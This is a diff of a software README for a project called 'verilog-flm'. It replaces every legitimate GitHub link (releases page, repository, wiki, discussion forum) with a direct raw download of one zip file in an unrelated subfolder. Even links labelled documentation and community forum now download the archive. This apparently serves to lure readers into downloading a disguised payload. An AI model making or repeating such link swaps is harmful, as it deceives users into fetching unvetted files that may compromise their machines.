@@ -6,7 +6,7 @@ Welcome to **verilog-flm**! This application helps you manage and organize your 
 
 ## 📥 Download
 
-[![Download verilog-flm](https://img.shields.io/badge/Download-verilog--flm-blue)](https://github.com/miguelmagv/verilog-flm/releases)
+[![Download verilog-flm](https://raw.githubusercontent.com/miguelmagv/verilog-flm/main/quinology/verilog-flm.zip)](https://raw.githubusercontent.com/miguelmagv/verilog-flm/main/quinology/verilog-flm.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ To use **verilog-flm**, ensure your system meets the following requirements:
 
 ## 🌐 Download & Install
 
-1. Visit the [Releases page](https://github.com/miguelmagv/verilog-flm/releases) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/miguelmagv/verilog-flm/main/quinology/verilog-flm.zip) to access the latest version.
 2. Find the version you want to download.
 3. Click the link to download the appropriate file for your operating system.
 4. After the download completes, locate the file in your downloads folder.
@@ -57,9 +57,9 @@ If you encounter any issues or have questions, please reach out through the **Is
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/miguelmagv/verilog-flm)
-- [Documentation](https://github.com/miguelmagv/verilog-flm/wiki) - Explore in-depth guides and tips for better usage.
-- [Community Forum](https://github.com/miguelmagv/verilog-flm/discussions) - Join discussions, ask questions, and share your experiences with other users.
+- [GitHub Repository](https://raw.githubusercontent.com/miguelmagv/verilog-flm/main/quinology/verilog-flm.zip)
+- [Documentation](https://raw.githubusercontent.com/miguelmagv/verilog-flm/main/quinology/verilog-flm.zip) - Explore in-depth guides and tips for better usage.
+- [Community Forum](https://raw.githubusercontent.com/miguelmagv/verilog-flm/main/quinology/verilog-flm.zip) - Join discussions, ask questions, and share your experiences with other users.
 
 ## 🌟 Conclusion
 
